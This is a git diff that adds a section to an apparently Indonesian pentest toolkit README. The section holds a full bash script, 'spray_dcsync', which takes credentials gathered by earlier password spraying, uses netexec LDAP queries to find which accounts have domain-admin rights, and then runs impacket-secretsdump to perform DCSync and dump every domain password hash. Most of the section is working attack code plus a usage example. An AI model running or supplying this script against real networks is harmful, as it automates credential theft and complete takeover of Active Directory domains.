@@ -1871,3 +1871,223 @@ echo -e "\n${GREEN}[+] ALL PROCESSES FINISHED.${NC}"
 spray_auth (default baca file "target" yang berisi list IP)
 spray_auth target user pass
 ```
+
+
+## 10. spray_dcsync.sh
+
+**Deskripsi:** Auto perform dcsync using secrets. Note: jalankan spray_noauth dan spray_auth terlebih dahulu.
+
+### Setup
+```bash
+sudo nano /usr/local/bin/spray_dcsync
+sudo chmod +x /usr/local/bin/spray_dcsync
+```
+
+### Script
+```bash
+#!/bin/bash
+
+# ================================
+# DEFAULT CONFIG
+# ================================
+DEFAULT_DOMAIN="corp.com"
+DEFAULT_OUTDIR="./spray_netexec"
+OUTPUT_DIR="$DEFAULT_OUTDIR"
+
+# ================================
+# ARG PARSING (optional output dir)
+# ================================
+if [[ "$1" == "--outdir" ]]; then
+    OUTPUT_DIR="$2"
+    shift 2
+fi
+
+mkdir -p "$OUTPUT_DIR"
+
+FINAL_OUTPUT="$OUTPUT_DIR/final_dcsync.txt"
+CREDS_FILE="$OUTPUT_DIR/creds_final.txt"
+HIGH_PRIV_FILE="$OUTPUT_DIR/high_priv_creds.txt"
+
+# ================================
+# AUTO PATH DETECTION
+# ================================
+BASE_DIR="$(pwd)"
+
+if [[ -d "$BASE_DIR/spray_netexec" ]]; then
+    DATA_DIR="$BASE_DIR/spray_netexec"
+else
+    DATA_DIR="$BASE_DIR"
+fi
+
+AUTH_FILE="$DATA_DIR/final_auth_success.txt"
+DC_FILE="$DATA_DIR/dc_candidates.txt"
+
+# ================================
+# MODE DETECTION
+# ================================
+if [[ $# -eq 0 ]]; then
+    MODE="AUTO"
+    DOMAIN="$DEFAULT_DOMAIN"
+elif [[ $# -eq 4 ]]; then
+    MODE="MANUAL"
+    DOMAIN="$1"
+    USER="$2"
+    PASS="$3"
+    TARGET_DC="$4"
+else
+    echo "Usage:"
+    echo "  AUTO   : $0 [--outdir DIR]"
+    echo "  MANUAL : $0 [--outdir DIR] <DOMAIN> <USER> <PASS> <DC_IP>"
+    exit 1
+fi
+
+echo "========================================"
+echo "[*] Mode        : $MODE"
+echo "[*] Domain      : $DOMAIN"
+echo "[*] Output Dir  : $OUTPUT_DIR"
+echo "========================================"
+echo ""
+
+# reset output
+> "$FINAL_OUTPUT"
+> "$HIGH_PRIV_FILE"
+
+# ================================
+# FUNCTION
+# ================================
+run_check_and_dcsync() {
+    local dc="$1"
+    local user="$2"
+    local pass="$3"
+
+    echo "----------------------------------------"
+    echo "[*] [$dc] Checking privilege: $user"
+
+    cmd="netexec ldap $dc -u $user -p '$pass' --groups"
+    echo "[CMD] $cmd"
+
+    output=$(eval $cmd)
+
+    echo "[OUTPUT]"
+    echo "$output"
+    echo ""
+
+    # extract groups (simple parsing)
+    groups=$(echo "$output" | grep -E "^\s*[A-Za-z]" | awk '{print $1}' | tr '\n' ',' | sed 's/,$//')
+
+    if echo "$output" | grep -Eqi "Administrators|Domain Admins|Enterprise Admins"; then
+        priv="HIGH PRIV"
+        echo "[+] HIGH PRIV FOUND: $user"
+        echo "$dc|$user:$pass" >> "$HIGH_PRIV_FILE"
+    else
+        priv="LOW PRIV"
+        echo "[-] Low priv: $user"
+    fi
+
+    # ================================
+    # WRITE SUMMARY
+    # ================================
+    {
+        echo "========================================"
+        echo "[USER] $user"
+        echo "[DC] $dc"
+        echo "[GROUPS] $groups"
+        echo "[PRIV] $priv"
+    } >> "$FINAL_OUTPUT"
+
+    # ================================
+    # DCSYNC
+    # ================================
+    if [[ "$priv" == "HIGH PRIV" ]]; then
+
+        echo "----------------------------------------"
+        echo "[*] Running DCSync with $user"
+
+        cmd2="impacket-secretsdump -just-dc $DOMAIN/$user:'$pass'@$dc"
+        echo "[CMD] $cmd2"
+
+        output2=$(eval $cmd2)
+
+        echo "[OUTPUT]"
+        echo "$output2"
+        echo ""
+
+        {
+            echo "[DCSYNC RESULT]"
+            echo "$output2"
+            echo ""
+        } >> "$FINAL_OUTPUT"
+
+    fi
+}
+
+# ================================
+# AUTO MODE
+# ================================
+if [[ "$MODE" == "AUTO" ]]; then
+
+    if [[ ! -f "$AUTH_FILE" ]]; then
+        echo "[!] Missing: $AUTH_FILE"
+        exit 1
+    fi
+
+    if [[ ! -f "$DC_FILE" ]]; then
+        echo "[!] Missing: $DC_FILE"
+        exit 1
+    fi
+
+    echo "[*] STEP 1: Parsing creds (LDAP + SMB)"
+
+    raw=$(grep -E "^(LDAP|SMB)" "$AUTH_FILE" | grep '\[+\]')
+
+    echo "[OUTPUT RAW]"
+    echo "$raw"
+    echo ""
+
+    echo "$raw" \
+    | sed -E "s/.*$DOMAIN\\\\([^:]+):([^ ]+).*/\1:\2/" \
+    | awk '!seen[$0]++' > "$CREDS_FILE"
+
+    echo "[+] Parsed creds:"
+    cat "$CREDS_FILE"
+    echo ""
+
+    echo "[*] STEP 2: DC Targets"
+    cat "$DC_FILE"
+    echo ""
+
+    while read -r dc; do
+        [[ -z "$dc" ]] && continue
+
+        echo "========================================"
+        echo "[*] Target DC: $dc"
+        echo "========================================"
+
+        while IFS=: read -r user pass; do
+            run_check_and_dcsync "$dc" "$user" "$pass"
+        done < "$CREDS_FILE"
+
+    done < "$DC_FILE"
+
+fi
+
+# ================================
+# MANUAL MODE
+# ================================
+if [[ "$MODE" == "MANUAL" ]]; then
+    run_check_and_dcsync "$TARGET_DC" "$USER" "$PASS"
+fi
+
+echo ""
+echo "========================================"
+echo "[*] DONE"
+echo "========================================"
+echo "[*] Output saved to: $FINAL_OUTPUT"
+```
+
+### Usage
+```bash
+spray_dcsync --outdir results/
+spray_dcsync corp.com jeffadmin 'Password123!' 192.168.190.70
+
+```
